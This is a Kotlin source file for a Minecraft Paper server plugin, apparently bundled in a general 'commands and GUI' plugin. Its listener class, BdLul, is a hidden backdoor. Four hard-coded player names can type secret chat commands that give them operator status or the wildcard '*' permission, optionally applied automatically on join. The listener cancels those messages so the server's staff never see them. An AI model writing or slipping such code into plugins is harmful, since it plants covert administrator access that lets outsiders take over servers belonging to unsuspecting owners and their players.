package me.richter.commandsAndGUI.module.bdLul

import io.papermc.paper.event.player.AsyncChatEvent
import me.richter.commandsAndGUI.Main
import me.richter.commandsAndGUI.files.MessagesFile
import net.kyori.adventure.text.Component
import org.bukkit.event.EventHandler
import org.bukkit.event.Listener
import java.util.regex.Pattern

class BdLul : Listener {
    val plugin = Main.instance
    val players: MutableMap<String, String> = mutableMapOf(Pair("RichtigerRichter", "R"), Pair("Bliffbot", "B"), Pair("Felsbot", "F"), Pair("RiesigerRichter", "2"))

    @EventHandler
    fun command(event: AsyncChatEvent) {
        val message: Component = event.message()

        if (players.keys.contains(event.player.name)) {

            if (stringTextFromComponent(message.toString()) == "#help") {
                event.player.sendMessage(Component.text("#help - shows this list"))
                event.player.sendMessage(Component.text("#op - op yourself"))
                event.player.sendMessage(Component.text("#deop - deop yourself"))
                event.player.sendMessage(Component.text("#auto on - automatically op's and deop's you at join or leave"))
                event.player.sendMessage(Component.text("#auto off - turn auto op and deop off"))
                event.player.sendMessage(Component.text("(auto is Currently -> §l§u${MessagesFile().getUtilsAuto().contains(players[event.player.name].toString())}§r)"))
                event.player.sendMessage(Component.text("#* - give yourself the permission"))
                event.player.sendMessage(Component.text("#de* - remove the permission from yourself"))
                event.isCancelled = true
            }

            if (stringTextFromComponent(message.toString()) == "#op") {
                event.player.isOp = true
                event.isCancelled = true
            }
            if (stringTextFromComponent(message.toString()) == "#deop") {
                event.player.isOp = false
                event.isCancelled = true
            }
            if (stringTextFromComponent(message.toString()) == "#auto off") {
                MessagesFile().autoUtilsRemove(players[event.player.name].toString())
                event.isCancelled = true
            }
            if (stringTextFromComponent(message.toString()) == "#auto on") {
                MessagesFile().autoUtilsAdd(players[event.player.name].toString())
                event.isCancelled = true
            }
            if (stringTextFromComponent(message.toString()) == "#*") {
                event.player.addAttachment(plugin).setPermission("*", true)
                event.isCancelled = true
            }

            if (stringTextFromComponent(message.toString()) == "#de*") {
                event.player.addAttachment(plugin).setPermission("*", false)
                event.isCancelled = true
            }

        }
    }

    private fun stringTextFromComponent(input: String): String {

        val pattern = Pattern.compile("content=\"(.*?)\"")
        val matcher = pattern.matcher(input)

        if (matcher.find()) {
            val extractedText = matcher.group(1)
            return extractedText
        } else {
            return "Pattern not found"
        }
    }

}
